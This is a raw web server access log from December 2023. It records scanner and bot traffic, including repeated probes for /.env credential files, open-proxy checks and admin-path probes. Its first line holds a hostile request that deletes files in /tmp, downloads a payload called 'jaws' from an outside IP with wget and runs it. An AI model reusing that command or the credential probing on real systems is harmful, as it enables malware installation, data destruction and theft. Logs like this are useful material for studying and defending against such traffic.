102.220.93.199 - - [01/Dec/2023:13:27:30 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1" 404 6869 "-" "Hello, world"
54.243.7.211 - - [01/Dec/2023:13:30:12 +0000] "GET / HTTP/1.1" 200 8278 "-" "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"
109.81.175.193 - - [01/Dec/2023:13:34:22 +0000] "GET / HTTP/1.1" 200 28640 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
135.125.244.48 - - [01/Dec/2023:13:35:52 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [01/Dec/2023:13:35:52 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
3.236.140.101 - - [01/Dec/2023:14:05:09 +0000] "GET / HTTP/1.1" 200 8278 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15"
185.254.196.186 - - [01/Dec/2023:14:09:21 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.186 - - [01/Dec/2023:14:09:22 +0000] "POST / HTTP/1.1" 405 1026564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.147.246.210 - - [01/Dec/2023:14:25:31 +0000] "GET /mbilling/ HTTP/1.0" 301 545 "-" "xfa1"
135.125.244.48 - - [01/Dec/2023:14:34:15 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [01/Dec/2023:14:34:15 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.173 - - [01/Dec/2023:14:51:59 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.173 - - [01/Dec/2023:14:52:00 +0000] "POST / HTTP/1.1" 405 1026564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
1.14.7.100 - - [01/Dec/2023:15:17:22 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
54.183.164.142 - - [01/Dec/2023:15:48:01 +0000] "GET / HTTP/1.1" 200 8278 "-" "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1"
3.231.215.167 - - [01/Dec/2023:16:28:48 +0000] "GET / HTTP/1.1" 200 8278 "-" "everyfeed-spider/2.0 (http://www.everyfeed.com)"
185.254.196.173 - - [01/Dec/2023:16:37:25 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.173 - - [01/Dec/2023:16:37:27 +0000] "POST / HTTP/1.1" 405 1026564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [01/Dec/2023:16:45:02 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [01/Dec/2023:16:45:03 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
104.140.148.58 - - [01/Dec/2023:17:09:18 +0000] "\x16\x03\x01" 400 483 "-" "-"
104.140.148.58 - - [01/Dec/2023:17:09:18 +0000] "\x16\x03\x01" 400 483 "-" "-"
104.140.148.58 - - [01/Dec/2023:17:09:19 +0000] "\x16\x03\x01" 400 483 "-" "-"
104.140.148.58 - - [01/Dec/2023:17:09:19 +0000] "\x16\x03\x01" 400 483 "-" "-"
104.140.148.58 - - [01/Dec/2023:17:09:21 +0000] "\x16\x03\x01" 400 483 "-" "-"
104.140.148.58 - - [01/Dec/2023:17:09:21 +0000] "\x16\x03\x01" 400 483 "-" "-"
104.140.148.58 - - [01/Dec/2023:17:09:25 +0000] "\x16\x03\x01" 400 483 "-" "-"
104.140.148.58 - - [01/Dec/2023:17:09:25 +0000] "\x16\x03\x01" 400 483 "-" "-"
50.17.94.196 - - [01/Dec/2023:17:10:40 +0000] "GET / HTTP/1.1" 200 8278 "-" "Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1  (KHTML, Like Gecko) Version/6.0.0.141 Mobile Safari/534.1"
1.14.7.100 - - [01/Dec/2023:17:28:25 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
3.128.87.86 - - [01/Dec/2023:17:32:18 +0000] "GET / HTTP/1.1" 200 8278 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
3.128.87.86 - - [01/Dec/2023:17:37:04 +0000] "GET / HTTP/1.1" 200 8278 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1"
45.79.181.104 - - [01/Dec/2023:17:50:47 +0000] "\x16\x03\x01" 400 483 "-" "-"
135.125.244.48 - - [01/Dec/2023:17:53:43 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [01/Dec/2023:17:53:43 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
90.151.171.106 - - [01/Dec/2023:18:00:21 +0000] "CONNECT api.ipify.org:443 HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from) Z75720595780Q1"
90.151.171.106 - - [01/Dec/2023:18:00:31 +0000] "GET http://api.ipify.org?Z75720595780Q1 HTTP/1.1" 404 6832 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
192.241.212.23 - - [01/Dec/2023:18:03:57 +0000] "GET / HTTP/1.1" 200 8259 "-" "Mozilla/5.0 zgrab/0.x"
34.79.162.186 - - [01/Dec/2023:18:22:23 +0000] "GET / HTTP/1.1" 200 8315 "-" "python-requests/2.31.0"
167.94.138.33 - - [01/Dec/2023:18:51:36 +0000] "GET / HTTP/1.1" 200 28640 "-" "-"
167.94.138.33 - - [01/Dec/2023:18:51:40 +0000] "GET / HTTP/1.1" 200 8259 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.33 - - [01/Dec/2023:18:51:40 +0000] "PRI * HTTP/2.0" 400 483 "-" "-"
167.94.138.33 - - [01/Dec/2023:18:51:40 +0000] "GET /favicon.ico HTTP/1.1" 200 259 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
36.156.22.4 - - [01/Dec/2023:18:59:55 +0000] "\x16\x03\x01" 400 483 "-" "-"
36.156.22.4 - - [01/Dec/2023:18:59:56 +0000] "GET / HTTP/1.1" 200 8259 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
36.156.22.4 - - [01/Dec/2023:18:59:57 +0000] "\x16\x03\x01" 400 483 "-" "-"
36.156.22.4 - - [01/Dec/2023:18:59:59 +0000] "\x16\x03\x01" 400 483 "-" "-"
36.156.22.4 - - [01/Dec/2023:19:00:00 +0000] "\x16\x03\x01" 400 483 "-" "-"
36.156.22.4 - - [01/Dec/2023:19:00:00 +0000] "\x16\x03\x01" 400 483 "-" "-"
36.156.22.4 - - [01/Dec/2023:19:00:07 +0000] "\x16\x03\x01" 400 483 "-" "-"
36.156.22.4 - - [01/Dec/2023:19:00:09 +0000] "\x16\x03\x01" 400 483 "-" "-"
90.151.171.106 - - [01/Dec/2023:19:02:11 +0000] "CONNECT fingerprints.bablosoft.com:443 HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from) Z75720595780Q1"
90.151.171.106 - - [01/Dec/2023:19:02:21 +0000] "GET http://fingerprints.bablosoft.com/ip?Z75720595780Q1 HTTP/1.1" 404 6832 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
198.199.103.107 - - [01/Dec/2023:19:05:24 +0000] "GET /druid/index.html HTTP/1.1" 404 6813 "-" "Mozilla/5.0 zgrab/0.x"
90.151.171.108 - - [01/Dec/2023:19:12:52 +0000] "CONNECT fingerprints.bablosoft.com:443 HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from) Z75720595780Q1"
90.151.171.108 - - [01/Dec/2023:19:13:02 +0000] "GET http://fingerprints.bablosoft.com/ip?Z75720595780Q1 HTTP/1.1" 404 6832 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
1.14.7.100 - - [01/Dec/2023:19:21:01 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
135.125.244.48 - - [01/Dec/2023:19:30:55 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [01/Dec/2023:19:30:55 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.251.102.74 - - [01/Dec/2023:19:43:38 +0000] "GET / HTTP/1.1" 200 8259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
172.104.11.4 - - [01/Dec/2023:19:51:02 +0000] "\x16\x03\x01" 400 483 "-" "-"
118.123.105.92 - - [01/Dec/2023:20:00:38 +0000] "GET / HTTP/1.0" 200 28656 "-" "-"
118.123.105.92 - - [01/Dec/2023:20:00:40 +0000] "GET /favicon.ico HTTP/1.1" 200 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.92 - - [01/Dec/2023:20:00:40 +0000] "GET /robots.txt HTTP/1.1" 200 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.92 - - [01/Dec/2023:20:00:41 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
54.243.7.211 - - [01/Dec/2023:20:26:15 +0000] "GET / HTTP/1.1" 200 8278 "-" "Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025"
198.235.24.129 - - [01/Dec/2023:20:32:45 +0000] "\x16\x03\x01" 400 483 "-" "-"
198.235.24.129 - - [01/Dec/2023:20:32:45 +0000] "\x16\x03\x01" 400 483 "-" "-"
207.90.244.6 - - [01/Dec/2023:20:34:24 +0000] "GET / HTTP/1.1" 200 28640 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
207.90.244.6 - - [01/Dec/2023:20:34:24 +0000] "GET /robots.txt HTTP/1.1" 200 252 "-" "-"
207.90.244.6 - - [01/Dec/2023:20:34:24 +0000] "GET /sitemap.xml HTTP/1.1" 404 6813 "-" "-"
207.90.244.6 - - [01/Dec/2023:20:34:24 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 6813 "-" "-"
207.90.244.6 - - [01/Dec/2023:20:34:25 +0000] "GET /favicon.ico HTTP/1.1" 200 296 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
185.180.143.50 - - [01/Dec/2023:21:00:20 +0000] "GET / HTTP/1.1" 200 8259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
1.14.7.100 - - [01/Dec/2023:21:07:05 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
135.125.244.48 - - [01/Dec/2023:21:29:54 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [01/Dec/2023:21:29:54 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.128.205 - - [01/Dec/2023:21:46:10 +0000] "\x16\x03\x01" 400 483 "-" "-"
35.203.211.91 - - [01/Dec/2023:21:57:46 +0000] "GET / HTTP/1.1" 200 28640 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
167.248.133.49 - - [01/Dec/2023:22:36:01 +0000] "GET / HTTP/1.1" 200 28640 "-" "-"
167.248.133.49 - - [01/Dec/2023:22:36:06 +0000] "GET / HTTP/1.1" 200 8259 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.49 - - [01/Dec/2023:22:36:06 +0000] "PRI * HTTP/2.0" 400 483 "-" "-"
167.248.133.49 - - [01/Dec/2023:22:36:07 +0000] "GET /favicon.ico HTTP/1.1" 200 259 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
176.97.210.240 - - [01/Dec/2023:22:43:55 +0000] "GET / HTTP/1.1" 200 28640 "-" "Go-http-client/1.1"
1.14.7.100 - - [01/Dec/2023:22:55:31 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
3.236.140.101 - - [01/Dec/2023:23:13:52 +0000] "GET / HTTP/1.1" 200 8278 "-" "Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7"
90.151.171.108 - - [01/Dec/2023:23:23:57 +0000] "CONNECT fingerprints.bablosoft.com:443 HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from) Z75720595780Q1"
90.151.171.108 - - [01/Dec/2023:23:24:07 +0000] "GET http://fingerprints.bablosoft.com/ip?Z75720595780Q1 HTTP/1.1" 404 6832 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
135.125.244.48 - - [01/Dec/2023:23:41:11 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [01/Dec/2023:23:41:11 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.235.24.139 - - [01/Dec/2023:23:59:38 +0000] "GET / HTTP/1.1" 200 28640 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.254.196.186 - - [02/Dec/2023:00:00:20 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.186 - - [02/Dec/2023:00:00:21 +0000] "POST / HTTP/1.1" 405 1026564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [02/Dec/2023:00:20:34 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [02/Dec/2023:00:20:34 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.235.24.166 - - [02/Dec/2023:00:25:12 +0000] "GET / HTTP/1.1" 200 28640 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
54.185.56.4 - - [02/Dec/2023:00:34:37 +0000] "GET / HTTP/1.1" 200 8278 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
1.14.7.100 - - [02/Dec/2023:00:46:14 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
3.254.208.33 - - [02/Dec/2023:00:53:30 +0000] "HEAD / HTTP/1.1" 200 1103 "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
164.92.140.179 - - [02/Dec/2023:01:27:55 +0000] "GET / HTTP/1.1" 200 8259 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
54.245.66.46 - - [02/Dec/2023:02:31:48 +0000] "GET / HTTP/1.1" 200 8315 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
135.125.246.189 - - [02/Dec/2023:02:38:50 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [02/Dec/2023:02:38:50 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
1.14.7.100 - - [02/Dec/2023:02:43:18 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
3.101.66.98 - - [02/Dec/2023:02:44:45 +0000] "OPTIONS / HTTP/1.1" 200 313 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
90.151.171.106 - - [02/Dec/2023:02:47:43 +0000] "CONNECT v4.ident.me:443 HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from) Z75720595780Q1"
90.151.171.106 - - [02/Dec/2023:02:47:53 +0000] "GET http://v4.ident.me?Z75720595780Q1 HTTP/1.1" 404 6832 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.108 - - [02/Dec/2023:03:40:24 +0000] "CONNECT eth0.me:443 HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from) Z75720595780Q1"
135.125.246.189 - - [02/Dec/2023:03:40:25 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [02/Dec/2023:03:40:25 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
90.151.171.108 - - [02/Dec/2023:03:40:34 +0000] "GET http://eth0.me?Z75720595780Q1 HTTP/1.1" 404 6832 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
185.224.128.187 - - [02/Dec/2023:03:44:12 +0000] "GET / HTTP/1.1" 200 28640 "-" "-"
3.254.179.186 - - [02/Dec/2023:04:05:34 +0000] "HEAD / HTTP/1.1" 200 1103 "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
103.147.246.210 - - [02/Dec/2023:04:14:54 +0000] "GET /mbilling/ HTTP/1.0" 301 545 "-" "xfa1"
1.14.7.100 - - [02/Dec/2023:04:44:31 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
64.62.197.26 - - [02/Dec/2023:05:12:22 +0000] "\x16\x03\x01" 400 483 "-" "-"
135.125.246.189 - - [02/Dec/2023:05:25:12 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [02/Dec/2023:05:25:12 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.17 - - [02/Dec/2023:05:35:20 +0000] "GET / HTTP/1.0" 200 28656 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.180.140.5 - - [02/Dec/2023:05:58:42 +0000] "GET / HTTP/1.1" 200 8259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
1.14.7.100 - - [02/Dec/2023:06:53:00 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
176.97.210.240 - - [02/Dec/2023:07:24:12 +0000] "GET / HTTP/1.1" 200 28640 "-" "Go-http-client/1.1"
90.151.171.106 - - [02/Dec/2023:07:40:29 +0000] "CONNECT checkip.amazonaws.com:443 HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from) Z75720595780Q1"
90.151.171.106 - - [02/Dec/2023:07:40:39 +0000] "GET http://checkip.amazonaws.com?Z75720595780Q1 HTTP/1.1" 404 6832 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
78.153.140.219 - - [02/Dec/2023:07:49:13 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.219 - - [02/Dec/2023:07:49:14 +0000] "\x16\x03\x01\x01H\x01" 400 483 "-" "-"
135.125.246.189 - - [02/Dec/2023:07:57:06 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [02/Dec/2023:07:57:07 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.200 - - [02/Dec/2023:08:33:55 +0000] "\x16\x03\x01" 400 483 "-" "-"
205.210.31.200 - - [02/Dec/2023:08:33:55 +0000] "\x16\x03\x01" 400 483 "-" "-"
1.14.7.100 - - [02/Dec/2023:09:03:08 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
3.10.24.130 - - [02/Dec/2023:09:09:13 +0000] "" 400 483 "-" "-"
3.10.24.130 - - [02/Dec/2023:09:10:18 +0000] "\x16\x03\x01" 400 483 "-" "-"
3.10.24.130 - - [02/Dec/2023:09:11:58 +0000] "\x16\x03\x01" 400 483 "-" "-"
3.10.24.130 - - [02/Dec/2023:09:12:45 +0000] "GET /favicon.ico HTTP/1.1" 200 240 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
3.10.24.130 - - [02/Dec/2023:09:13:30 +0000] "\x16\x03\x01" 400 483 "-" "-"
3.10.24.130 - - [02/Dec/2023:09:14:18 +0000] "GET /manage/account/login HTTP/1.1" 404 6813 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
185.180.143.138 - - [02/Dec/2023:09:14:46 +0000] "GET / HTTP/1.1" 200 8259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
3.10.24.130 - - [02/Dec/2023:09:15:40 +0000] "\x16\x03\x01" 400 483 "-" "-"
3.10.24.130 - - [02/Dec/2023:09:16:27 +0000] "GET /admin/index.html HTTP/1.1" 404 6813 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
3.10.24.130 - - [02/Dec/2023:09:17:46 +0000] "\x16\x03\x01" 400 483 "-" "-"
3.10.24.130 - - [02/Dec/2023:09:18:34 +0000] "GET /index.html HTTP/1.1" 404 6813 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
3.10.24.130 - - [02/Dec/2023:09:20:06 +0000] "\x16\x03\x01" 400 483 "-" "-"
3.10.24.130 - - [02/Dec/2023:09:20:54 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 404 6813 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
3.10.24.130 - - [02/Dec/2023:09:22:15 +0000] "\x16\x03\x01" 400 483 "-" "-"
